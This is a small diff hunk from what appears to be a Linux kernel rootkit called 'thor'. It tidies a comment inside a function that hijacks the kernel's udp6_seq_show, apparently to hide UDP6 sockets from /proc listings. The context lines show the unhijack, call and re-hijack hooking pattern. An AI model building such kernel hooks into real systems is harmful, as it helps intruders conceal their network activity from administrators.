@@ -227,7 +227,7 @@ static int thor_udp6_seq_show(struct seq_file *seq, void *v)
      * TODO: this leaves the udp6_seq_show function unhijacked for a few
      * cycles, ideally we would execute the content of udp6_seq_show_firstinstr
      * and jump to the second instruction of the original udp6_seq_show
-     * */
+     */
     unhijack(udp6_seq_show);
     ret = udp6_seq_show(seq, v);
     hijack(udp6_seq_show, thor_udp6_seq_show);
